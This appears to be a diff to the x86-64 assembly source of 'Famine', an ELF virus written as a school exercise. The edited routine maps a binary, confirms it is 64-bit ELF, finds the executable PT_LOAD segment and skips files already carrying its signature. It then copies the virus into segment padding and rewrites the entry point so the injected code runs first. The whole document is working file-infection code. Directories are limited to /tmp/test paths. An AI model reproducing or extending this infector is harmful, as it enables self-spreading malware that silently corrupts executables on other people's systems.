@@ -301,13 +301,13 @@ _infect_file: ; (string rdi, stat rsi)
 	push rax
 	pop rsi
 	lea rdi, [rel elf_magic]
-	push 3
+	push 4
 	pop rdx
 	call _ft_memcmp
 	push rsi
 	pop r13
 	cmp rax, 0x0
-	jne .unmap ; not elf file
+	jne .unmap ; not elf 64 file
 
 	cmp byte[rsi + 16], 2 ; ET_EXEC
 	je .is_elf_file
@@ -316,31 +316,25 @@ _infect_file: ; (string rdi, stat rsi)
 
 	.is_elf_file:
 		; TODO: do 32 bits version (new compilation ?)
-		cmp byte[rsi + 4], 2 ; ELFCLASS64
-		jne .unmap
 
 		; get pt_load exec
-		mov rsi, [r13 + 32]; e_phoff
 		mov ax, [r13 + 56]; e_phnum
-		mov rdi, r13
-		add rdi, rsi
+		mov rbx, r13
+		add rbx, [r13 + 32]; e_phoff
 		xor rcx, rcx
 		.find_segment_exec:
 			inc rcx
 			cmp rcx, rax ; TODO: can't be last PT_LOAD now
 			je .unmap
-			mov ebx, [rdi]; p_type
-			cmp ebx, 1 ; PT_LOAD
+			cmp dword[rbx], 1 ; p_type != PT_LOAD
 			jne .next
-			xor rdx, rdx
-			mov dx, [rdi + 4]; p_flags
+			mov dx, [rbx + 4]; p_flags
 			and dx, 1 ; PF_X
 			jnz .check_if_infected
 			.next:
-				add rdi, 56; sizeof(Elf64_Phdr)
+				add rbx, 56; sizeof(Elf64_Phdr)
 			jmp .find_segment_exec
 		.check_if_infected:
-			push rdi
 			lea rdi, [rel signature]
 			%ifdef DEBUG
 				call _print; _print(rdi)
@@ -350,67 +344,51 @@ _infect_file: ; (string rdi, stat rsi)
 			pop rcx
 			push rdi
 			pop rdx
-			pop rbx
-			mov rdi, r13
-			add rdi, [rbx + 8]; p_offset
+			mov rdi, [rbx + 8]; p_offset
+			add rdi, r13
 			mov rsi, [rbx + 32]; p_filesz
 			call _ft_memmem
-			push rbx
-			pop rdi
 			cmp rax, 0x0
 			jne .unmap
 
-			mov rax, [rdi + 8]; p_offset
-			add rax, [rdi + 32]; p_filesz
-			mov rsi, [rdi + 56 + 8] ; next->p_offset
-			sub rsi, rax
-			mov rax, r9
-			sub rax, r8
-			add rax, 8 * 3 ; params (uint64_t * nb)
-			cmp rsi, rax
+			; check size needed
+			sub rdi, r13
+			add rdi, rsi; p_offset + p_filesz
+			mov rsi, [rbx + 56 + 8] ; next->p_offset
+			sub rsi, rdi
+			mov rdx, r9
+			sub rdx, r8
+			add rdx, 8 * 3 ; params (uint64_t * nb)
+			cmp rsi, rdx
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
 			; TODO: maybe infect via PT_NOTE ?
 
-			mov rsi, [rdi + 8]; p_offset
-			add rsi, [rdi + 32]; p_filesz, rsi at the end of pt_load
-
 			; copy virus
-			push rdi
-			pop rbx
-			push rax
-			pop rdx
 			sub rdx, 8 * 3
-			push rsi
-			pop rdi
 			add rdi, r13 ; addr pointer -> mmap
 			mov rsi, r8
 			call _ft_memcpy
 
 			; add _params
 			add rax, rdx ; go to the end
-			mov rdi, [rbx + 16]
-			mov [rax], rdi ; vaddr
+			mov rsi, [rbx + 16]
+			mov [rax], rsi ; vaddr
 			add rax, 8
-			mov rdi, [rbx + 8] ; p_offset
-			mov [rax], rdi
-			mov rdi, [rbx + 32]; p_filesz
-			add [rax], rdi ; entry_inject
+			sub rdi, r13
 			; copy mapped 'padding' like 0x400000
-			mov rdi, [rbx + 16]
-			add [rax], rdi; vaddr
-			mov rdi, [rbx + 8]
-			sub [rax], rdi; p_offset
+			mov rsi, rdi
+			add rsi, [rbx + 16]; p_vaddr
+			sub rsi, [rbx + 8]; p_offset
+			mov [rax], rsi ; entry_inject
 			add rax, 8
-			mov rdi, [r13 + 24]; entry_prg
-			mov [rax], rdi
+			mov rsi, [r13 + 24]; entry_prg
+			mov [rax], rsi
 
 			; change entry
-			mov rsi, [rbx + 8]; p_offset
-			add rsi, [rbx + 32]; p_filesz
 			; copy mapped 'padding' like 0x400000
-			add rsi, [rbx + 16]; vaddr
-			sub rsi, [rbx + 8]; p_offset
-			mov [r13 + 24], rsi ; new_entry
+			add rdi, [rbx + 16]; vaddr
+			sub rdi, [rbx + 8]; p_offset
+			mov [r13 + 24], rdi ; new_entry
 
 			; change pt_load size
 			add rdx, 8 * 3
@@ -421,17 +399,18 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rdi, r11
 			mov rsi, r13
 			mov rdx, [r12 + 48]
-			mov rax, 1
+			push 1
+			pop rax
 			syscall
 	.unmap:
-		push r11
+;		push r11; munmap using r11 ?
 		push r13
 		pop rdi
 		mov rsi, [r12 + 48] ; statbuf.st_size
 		push 11
-		pop rax
+		pop rax; munmap
 		syscall
-		pop r11
+;		pop r11
 	.close:
 		push r11
 		pop rdi
@@ -443,7 +422,6 @@ _infect_file: ; (string rdi, stat rsi)
 		pop rdi
 		push r12
 		pop rsi
-		xor rax, rax
 
 	pop rdx
 	pop rcx
@@ -612,8 +590,8 @@ ret
 
 ; ==============================================================================
 
-;                   E     L    F   |       v ELFCLASS64
-elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x0 ;0x2, 0x0
+;                   E     L    F   |  v ELFCLASS64
+elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 dotdir db `.`, 0x0, `..`, 0x0, 0x0
 directories db `/tmp/test`, 0x0, `/tmp/test2`, 0x0, 0x0
 signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
